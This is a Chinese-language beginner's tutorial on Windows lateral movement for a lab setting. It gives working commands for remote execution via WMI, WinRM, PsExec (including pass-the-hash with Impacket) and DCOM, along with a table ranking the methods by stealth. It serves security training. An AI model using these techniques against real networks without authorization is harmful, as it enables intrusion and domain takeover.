# 横向移动 - 新手章节指南

## 这个目录是干什么的？

横向移动是指在获得一台机器的访问权限后，利用获取的凭证或其他方法访问网络中的其他机器。这是从单点突破到全面控制的关键步骤。

---

## 为什么要学这个？

```
横向移动的重要性：
├── 初始访问通常只是普通用户
├── 需要移动到更有价值的目标
├── 比如域控制器、数据库服务器
├── 最终目标是获得域管理员权限
└── 横向移动是必经之路

现实场景：
├── 你通过钓鱼获得了一台工作站
├── 提取了该机器上的凭证
├── 发现管理员也登录过这台机器
├── 用管理员凭证访问其他机器
└── 逐步扩大控制范围
```

## 通俗理解核心概念

### 横向移动的方法

```
1. WMI (Windows Management Instrumentation)
├── Windows 内置的管理接口
├── 可以远程执行命令
├── 需要管理员凭证
└── 常用于横向移动

2. WinRM (Windows Remote Management)
├── Windows 远程管理协议
├── 基于 HTTP/HTTPS
├── PowerShell Remoting 使用它
└── 需要管理员凭证

3. PsExec
├── Sysinternals 工具
├── 远程执行程序
├── 会创建服务
└── 容易被检测

4. DCOM (Distributed COM)
├── 分布式组件对象模型
├── 可以远程调用 COM 对象
├── 某些 COM 对象可以执行命令
└── 相对隐蔽

5. RDP (Remote Desktop Protocol)
├── 远程桌面
├── 图形界面访问
├── 需要凭证
└── 会留下登录记录
```

### Pass-the-Hash vs Pass-the-Ticket

```
Pass-the-Hash (PtH):
├── 使用 NTLM 哈希认证
├── 适用于 NTLM 认证场景
├── 比如 SMB、WMI
└── 不需要明文密码

Pass-the-Ticket (PtT):
├── 使用 Kerberos 票据认证
├── 适用于 Kerberos 认证场景
├── 比如域环境中的服务
└── 需要有效的票据

选择：
├── 非域环境 → PtH
├── 域环境 → PtH 或 PtT 都可以
└── 某些服务只接受 Kerberos → PtT
```

## 实操环境搭建

### 测试环境

```
推荐配置：
├── 至少 2 台 Windows 虚拟机
├── 在同一网段
├── 创建相同的本地管理员账户
├── 或搭建域环境
└── 确保网络连通

域环境（推荐）：
├── 1 台 Windows Server 作为 DC
├── 2-3 台 Windows 客户端
├── 创建域用户和组
└── 配置适当的权限
```

## 实践任务清单

### 任务1：使用 WMI 横向移动

```powershell
# 使用 wmic 执行远程命令
wmic /node:target_ip /user:Administrator /password:P@ssw0rd process call create "cmd.exe /c whoami > C:\result.txt"

# 使用 PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\result.txt" -ComputerName target_ip -Credential $cred
```

### 任务2：使用 WinRM 横向移动

```powershell
# 启用 WinRM（在目标机器上）
Enable-PSRemoting -Force

# 使用 PowerShell Remoting
$cred = Get-Credential
Enter-PSSession -ComputerName target_ip -Credential $cred

# 或执行单个命令
Invoke-Command -ComputerName target_ip -Credential $cred -ScriptBlock { whoami }
```

### 任务3：使用 PsExec 横向移动

```cmd
# 使用 Sysinternals PsExec
psexec.exe \\target_ip -u Administrator -p P@ssw0rd cmd.exe

# 使用 Impacket psexec
python psexec.py Administrator:P@ssw0rd@target_ip

# 使用哈希
python psexec.py -hashes :ntlm_hash Administrator@target_ip
```

### 任务4：使用 DCOM 横向移动

```powershell
# 使用 MMC20.Application COM 对象
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target_ip"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# 使用 ShellWindows COM 对象
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "target_ip"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

## 横向移动方法对比

```
┌──────────────┬─────────────┬─────────────┬─────────────┐
│ 方法         │ 隐蔽性      │ 需要的权限  │ 检测难度    │
├──────────────┼─────────────┼─────────────┼─────────────┤
│ WMI          │ 中          │ 管理员      │ 中          │
│ WinRM        │ 中          │ 管理员      │ 中          │
│ PsExec       │ 低          │ 管理员      │ 低（易检测）│
│ DCOM         │ 高          │ 管理员      │ 高          │
│ RDP          │ 低          │ RDP 权限    │ 低          │
│ SMB          │ 中          │ 管理员      │ 中          │
└──────────────┴─────────────┴─────────────┴─────────────┘
```
